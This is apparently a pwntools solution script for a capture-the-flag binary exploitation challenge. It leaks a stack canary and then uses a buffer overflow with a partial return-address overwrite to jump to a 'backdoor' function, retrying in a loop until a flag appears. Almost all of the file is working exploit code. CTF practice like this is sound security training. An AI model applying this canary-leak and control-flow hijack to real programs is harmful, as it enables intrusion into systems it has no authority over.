from pwn import *
context(arch='amd64', os='linux')

file_name = './pwn'

elf = ELF(file_name)

gdb_   = 1 if ('gdb'    in sys.argv)     else 0
switch = 1 if ('remote' in sys.argv)     else 0
debug  = 0 if ('deoff'  in sys.argv)     else 1
error  = 1 if ('error'  in sys.argv)     else 0
while True:
    if switch:
        target = '127.0.0.1'
        port   = 41425
        p = remote(target, port)
    else:
        p = process(file_name)

    if debug:
        context(log_level='debug')
        
    if error:
        context(log_level='error')     

    if gdb_ and switch == 0:
        gdb.attach(p)
        pause()

    def s(data):             return p.send(data)
    def sa(delim, data):     return p.sendafter(delim, data)
    def sl(data):            return p.sendline(data)
    def sla(delim, data):    return p.sendlineafter(delim, data)
    def r(numb=4096):        return p.recv(numb)
    def ru(delim, drop=True):return p.recvuntil(delim, drop)
    def rl():                return p.recvline()
    def ra(t=None):          return p.recvall(timeout=t)
    def cl():                return p.close()
    def it():                return p.interactive()
    def uu64(data):          return u64(data.ljust(8, b'\x00'))
    def search(s):           return next(elf.search(s if isinstance(s, bytes) else s.encode()))
    def lg(name, data):      return log.success(name + ': ' + (hex(data) if isinstance(data, int) else data.decode(errors='ignore') if isinstance(data, bytes) else str(data)))
    def menu(idx, pmt=b'>'): return sla(pmt, str(idx).encode())
    def ntpie(leak, offset, name='PIE'):  return setattr(elf, 'address', leak - (elf.sym[offset] if isinstance(offset, str) else offset)) or lg(name, elf.address)
    def ga(delim=b'\n', name='Leak'):     return [lg(f'{name}[{i}]', x) or x for i, x in enumerate([int(a, 16) for a in re.findall(b'0x[0-9a-fA-F]+', ru(delim))])]
    def fill(num, content=b'A'):          return (content.encode() if isinstance(content, str) else content) * num

    #################################################################################
    try:
        backdoor = 0x127d
        payload = flat([
        fill(0x20-0x8+0x1)
        ])
        sa(b"Here is a beautiful canary, and it will be watching over you.",payload)
        ru(b"A" * (0x20-0x8+0x1))
        canary = b'\x00' + r(7)
        payload2 = flat([
            fill(0x20-0x8),
            canary,
            fill(0x8),
            p16(backdoor)
        ])
        sa(b"be able to overflow enough bytes.",payload2)
        response = p.recvall(timeout=0.5)
        if b'flag{' in response or b'ctf{' in response:
            context.log_level = 'info' 
            lg("BINGO! Found flag", response)
            it()
            break
        p.close()
    except EOFError:
        p.close()
        continue
    except Exception as e:
        p.close()
        continue